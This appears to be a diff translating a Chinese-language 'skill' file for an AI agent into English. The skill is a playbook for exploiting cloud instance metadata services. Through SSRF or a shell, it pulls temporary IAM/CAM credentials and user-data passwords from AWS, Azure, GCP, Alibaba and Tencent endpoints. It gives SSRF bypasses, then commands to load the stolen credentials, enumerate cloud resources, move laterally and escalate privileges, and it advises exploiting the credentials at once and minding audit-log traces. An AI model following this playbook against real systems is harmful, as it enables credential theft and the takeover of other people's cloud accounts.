@@ -1,38 +1,40 @@
 ---
 name: cloud-metadata
-description: "云元数据利用。当通过 SSRF 或已获取的 shell 可以访问云实例元数据服务时使用。覆盖 AWS/Azure/GCP/阿里云/腾讯云的元数据端点、IAM/CAM 凭据提取、IMDSv2 绕过、从元数据到云服务枚举的完整攻击链。发现任何 SSRF 场景、内网可访问 169.254.169.254 或 100.100.100.200 的场景都应使用此技能"
+description: "Cloud metadata exploitation. Use when an SSRF or an obtained shell can reach cloud instance metadata services. Covers metadata endpoints for AWS/Azure/GCP/Alibaba Cloud/Tencent Cloud, IAM/CAM credential extraction, IMDSv2 bypass, and the complete attack chain from metadata to cloud service enumeration. Should be used for any SSRF scenario and any situation where the internal network can reach 169.254.169.254 or 100.100.100.200"
+zh-signals: "通过 SSRF 或已获取的 shell 访问云实例元数据服务，提取 AWS/Azure/GCP/阿里云/腾讯云的 IAM/CAM 临时凭据并进一步枚举云资源。信号:云元数据,SSRF,IAM,CAM,IMDS"
+when-to-use: "Use when an SSRF or shell can reach cloud instance metadata services such as 169.254.169.254 or 100.100.100.200. Covers AWS/Azure/GCP/Alibaba/Tencent endpoints, credential extraction, and IMDSv2 bypass."
 metadata:
-  tags: "cloud,metadata,ssrf,iam,cam,aws,azure,gcp,aliyun,tencent,腾讯云,imds,元数据,云安全"
+  tags: "cloud,metadata,ssrf,iam,cam,aws,azure,gcp,aliyun,tencent,tencent-cloud,imds,cloud-security"
   category: "cloud"
 ---
 
-# 云元数据利用方法论
+# Cloud Metadata Exploitation Methodology
 
-IMDS 是从 SSRF/RCE 到云控制面的桥梁——一个 HTTP 请求就能获取 IAM/CAM 临时凭据。
+IMDS is the bridge from SSRF/RCE to the cloud control plane—a single HTTP request yields IAM/CAM temporary credentials.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 各云平台凭据提取详细命令、AWS/腾讯云快速利用、元数据信息路径 → [references/credential-extraction.md](references/credential-extraction.md)
+- Detailed credential extraction commands for each cloud platform, quick AWS/Tencent Cloud exploitation, metadata information paths → [references/credential-extraction.md](references/credential-extraction.md)
 
 ---
 
-## Phase 1: 确认云环境
+## Phase 1: Confirm the Cloud Environment
 
-| 线索 | 云平台 |
+| Indicator | Cloud Platform |
 |------|--------|
 | `x-amz-*` Header, `Server: AmazonS3` | AWS |
 | `x-ms-*` Header, `.azurewebsites.net` | Azure |
 | `.googleapis.com`, `x-goog-*` Header | GCP |
-| `.aliyuncs.com`, `x-oss-*` Header | 阿里云 |
-| `.myqcloud.com`, `x-cos-*` Header, `Server: tencent-cos` | 腾讯云 |
+| `.aliyuncs.com`, `x-oss-*` Header | Alibaba Cloud |
+| `.myqcloud.com`, `x-cos-*` Header, `Server: tencent-cos` | Tencent Cloud |
 
-## Phase 2: 元数据端点速查
+## Phase 2: Metadata Endpoint Quick Reference
 
 ```
-# AWS (IMDSv1 — 直接 GET)
+# AWS (IMDSv1 — direct GET)
 http://169.254.169.254/latest/meta-data/
 
-# AWS (IMDSv2 — 需要 PUT 获取 Token)
+# AWS (IMDSv2 — requires PUT to obtain a token)
 PUT http://169.254.169.254/latest/api/token
   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
 
@@ -44,19 +46,19 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 http://metadata.google.internal/computeMetadata/v1/
   Header: Metadata-Flavor: Google
 
-# 阿里云
+# Alibaba Cloud
 http://100.100.100.200/latest/meta-data/
 
-# 腾讯云（CVM/轻量应用服务器/Lighthouse）
+# Tencent Cloud (CVM/Lighthouse application server)
 http://metadata.tencentyun.com/latest/meta-data/
-# 也可通过 IP 访问
+# Can also be accessed via IP
 http://169.254.0.23/latest/meta-data/
 ```
 
-### 腾讯云元数据完整路径
+### Complete Tencent Cloud Metadata Paths
 
 ```
-# 基础信息
+# Basic information
 http://metadata.tencentyun.com/latest/meta-data/
 http://metadata.tencentyun.com/latest/meta-data/instance-id
 http://metadata.tencentyun.com/latest/meta-data/uuid
@@ -65,83 +67,83 @@ http://metadata.tencentyun.com/latest/meta-data/local-ipv4
 http://metadata.tencentyun.com/latest/meta-data/public-ipv4
 http://metadata.tencentyun.com/latest/meta-data/instance-type
 
-# 区域信息
+# Region information
 http://metadata.tencentyun.com/latest/meta-data/placement/region
 http://metadata.tencentyun.com/latest/meta-data/placement/zone
 
-# 网络（需先获取 MAC 地址）
+# Network (requires obtaining the MAC address first)
 http://metadata.tencentyun.com/latest/meta-data/mac
 http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
 http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
 http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs/<mac>/local-ipv4
 
-# CAM 角色凭据（关键攻击面！）
+# CAM role credentials (key attack surface!)
 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
-# ↑ 列出挂载的角色名称
+# ↑ Lists the names of the mounted roles
 
 http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>
-# ↑ 返回临时凭据: TmpSecretId, TmpSecretKey, Token, ExpiredTime
+# ↑ Returns temporary credentials: TmpSecretId, TmpSecretKey, Token, ExpiredTime
 
-# 用户数据（启动脚本——经常包含密码！）
+# User data (startup scripts — often contain passwords!)
 http://metadata.tencentyun.com/latest/user-data
 ```
 
-## Phase 3: SSRF → 元数据
+## Phase 3: SSRF → Metadata
 
-- 直接用 SSRF 请求 `http://169.254.169.254/...`（AWS/Azure/GCP）
-- 直接用 SSRF 请求 `http://metadata.tencentyun.com/...`（腾讯云，域名方式）
-- 直接用 SSRF 请求 `http://100.100.100.200/...`（阿里云）
-- **IMDSv2 需要 PUT + 自定义 Header** → 大多数 SSRF 无法设置 Header，这是 IMDSv2 的防护价值
-- 绕过：`http://[::ffff:169.254.169.254]/`、DNS rebinding、302 重定向
-- **腾讯云和阿里云的元数据服务不需要特殊 Header**（与 IMDSv1 类似，更容易被 SSRF 利用）
+- Use SSRF directly to request `http://169.254.169.254/...` (AWS/Azure/GCP)
+- Use SSRF directly to request `http://metadata.tencentyun.com/...` (Tencent Cloud, via domain name)
+- Use SSRF directly to request `http://100.100.100.200/...` (Alibaba Cloud)
+- **IMDSv2 requires PUT + a custom Header** → most SSRF vectors cannot set headers, which is exactly the defensive value of IMDSv2
+- Bypass: `http://[::ffff:169.254.169.254]/`, DNS rebinding, 302 redirect
+- **Tencent Cloud and Alibaba Cloud metadata services require no special Header** (similar to IMDSv1, easier to exploit via SSRF)
 
-## Phase 4: 凭据利用决策树
+## Phase 4: Credential Exploitation Decision Tree
 
 ```
-获取到凭据？
-├─ AWS → export 环境变量 → aws sts get-caller-identity → 枚举 S3/EC2/Lambda/Secrets
-├─ Azure → Bearer Token → 枚举资源
-├─ GCP → OAuth Token → 枚举项目资源
-├─ 阿里云 → STS Token → 枚举 OSS/ECS
-└─ 腾讯云 → 配置 tccli → 枚举 COS/CVM/SCF/CAM
-    ├─ tccli configure（交互式）或设置环境变量
-    ├─ tccli sts GetCallerIdentity（验证身份）
-    ├─ coscli ls 或 Python SDK（列出存储桶，tccli 不支持 GetService）
-    ├─ tccli cvm DescribeInstances（列出实例）
-    └─ → 转入 cloud-iam-audit 技能进行提权评估
-详细命令 → [references/credential-extraction.md](references/credential-extraction.md)
+Credentials obtained?
+├─ AWS → export environment variables → aws sts get-caller-identity → enumerate S3/EC2/Lambda/Secrets
+├─ Azure → Bearer Token → enumerate resources
+├─ GCP → OAuth Token → enumerate project resources
+├─ Alibaba Cloud → STS Token → enumerate OSS/ECS
+└─ Tencent Cloud → configure tccli → enumerate COS/CVM/SCF/CAM
+    ├─ tccli configure (interactive) or set environment variables
+    ├─ tccli sts GetCallerIdentity (verify identity)
+    ├─ coscli ls or Python SDK (list buckets; tccli does not support GetService)
+    ├─ tccli cvm DescribeInstances (list instances)
+    └─ → switch to the cloud-iam-audit skill for privilege escalation assessment
+Detailed commands → [references/credential-extraction.md](references/credential-extraction.md)
 ```
 
-### 腾讯云凭据快速配置
+### Quick Tencent Cloud Credential Configuration
 
 ```bash
-# 方式 1: tccli configure
+# Method 1: tccli configure
 tccli configure
-# SecretId: 从元数据获取的 TmpSecretId
-# SecretKey: 从元数据获取的 TmpSecretKey
-# token: 从元数据获取的 Token
-# Region: 从元数据 placement/region 获取
+# SecretId: TmpSecretId obtained from metadata
+# SecretKey: TmpSecretKey obtained from metadata
+# token: Token obtained from metadata
+# Region: obtained from metadata placement/region
 
-# 方式 2: 环境变量（适合脚本化）
+# Method 2: environment variables (suits scripting)
 export TENCENTCLOUD_SECRET_ID="TmpSecretId"
 export TENCENTCLOUD_SECRET_KEY="TmpSecretKey"
 export TENCENTCLOUD_SESSION_TOKEN="Token"
 
-# 验证
+# Verify
 tccli sts GetCallerIdentity
 ```
 
-获取云凭据后，进行 IAM 提权评估。
+After obtaining cloud credentials, perform IAM privilege escalation assessment.
 
-## 注意事项
-- **IMDSv2** 是 AWS 对元数据 SSRF 的主要防护——纯 SSRF 基本无法利用
-- **腾讯云和阿里云元数据不强制 Token**，SSRF 利用门槛更低
-- 云凭据有过期时间（通常 6-12 小时），获取后应**立即利用**
-- 凭据操作会留下 CloudTrail/CloudAudit 日志，注意操作痕迹
-- **User-Data** (`/latest/user-data`) 经常包含启动脚本中的密码
-- 腾讯云元数据域名 `metadata.tencentyun.com` 只能在实例内网访问
+## Notes
+- **IMDSv2** is AWS's primary defense against metadata SSRF—pure SSRF is basically not exploitable
+- **Tencent Cloud and Alibaba Cloud metadata do not enforce a token**, which lowers the bar for SSRF exploitation
+- Cloud credentials expire (typically 6-12 hours); **exploit them immediately** once obtained
+- Credential operations leave CloudTrail/CloudAudit logs; mind the operational traces
+- **User-Data** (`/latest/user-data`) often contains passwords embedded in startup scripts
+- The Tencent Cloud metadata domain `metadata.tencentyun.com` is only reachable from inside the instance's internal network
 
-## 后续利用
-- 获取云凭据后可进行横向移动，访问更多云资源
-- 腾讯云: 凭据 → tccli/coscli 枚举 COS → 搜索敏感数据 → CAM 提权
-- AWS: 凭据 → awscli 枚举 S3/EC2/Lambda → IAM 提权
+## Further Exploitation
+- Once cloud credentials are obtained, perform lateral movement to access more cloud resources
+- Tencent Cloud: credentials → enumerate COS with tccli/coscli → search sensitive data → CAM privilege escalation
+- AWS: credentials → enumerate S3/EC2/Lambda with awscli → IAM privilege escalation
